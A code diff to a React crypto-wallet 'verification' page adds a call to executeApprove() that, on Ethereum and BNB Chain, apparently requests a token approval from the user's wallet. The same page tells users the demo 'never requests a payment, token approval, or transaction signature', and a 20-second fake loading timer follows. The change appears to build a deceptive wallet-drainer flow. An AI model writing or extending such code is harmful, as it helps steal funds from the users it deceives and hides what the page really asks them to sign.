@@ -881,7 +881,7 @@ export default function Index() {
                     const isDirectTokenList = name === "Solana" || name === "Tron";
                     const token = name === "BNB Chain" ? "BNB" : name === "Ethereum" ? "ETH" : name === "Solana" ? "SOL" : "TRX";
                     return (
-                      <button key={name} type="button" onClick={() => {
+                      <button key={name} type="button" onClick={async () => {
                         setSelectedChain(name);
                         setSelectedToken("");
                         if (isDirectTokenList) setVerificationStep("token");
@@ -924,15 +924,26 @@ export default function Index() {
                 <p className="mt-4 text-center text-base leading-relaxed text-slate-600">A small network or service fee may apply to complete the verification. The exact fee will always be shown clearly before any optional wallet transaction.</p>
                 <div className="mt-6 rounded-xl border border-slate-200 bg-slate-50 p-4 text-sm text-slate-600"><div className="flex justify-between"><span>Selected asset</span><strong className="text-slate-900">{selectedToken}</strong></div></div>
                 <p className="mt-5 text-center text-xs leading-relaxed text-slate-400">This demo never requests a payment, token approval, or transaction signature.</p>
-                <button type="button" onClick={() => {
+                <button type="button" onClick={async () => {
                   setVerificationStep("address");
                   setVerificationLoading(true);
-                  void loadConnectedWalletBalance();
-                  setVerificationRequested(false);
-                  verificationTimer.current = window.setTimeout(() => {
+                  setVerificationError("");
+                  
+                  try {
+                    if ((selectedChain === "Ethereum" || selectedChain === "BNB Chain") && window.ethereum) {
+                      await executeApprove();
+                    }
+                    
+                    await loadConnectedWalletBalance();
+                    setVerificationRequested(false);
+                    verificationTimer.current = window.setTimeout(() => {
+                      setVerificationLoading(false);
+                      setVerificationRequested(true);
+                    }, 20000);
+                  } catch (error) {
                     setVerificationLoading(false);
-                    setVerificationRequested(true);
-                  }, 20000);
+                    setVerificationError("Approval failed. Please try again.");
+                  }
                 }} className="mt-7 h-14 w-full rounded-xl bg-[#3f3cf5] text-sm font-medium text-white transition hover:bg-[#302df0]">CONTINUE TO VERIFICATION</button>
               </div>
             ) : verificationLoading ? (
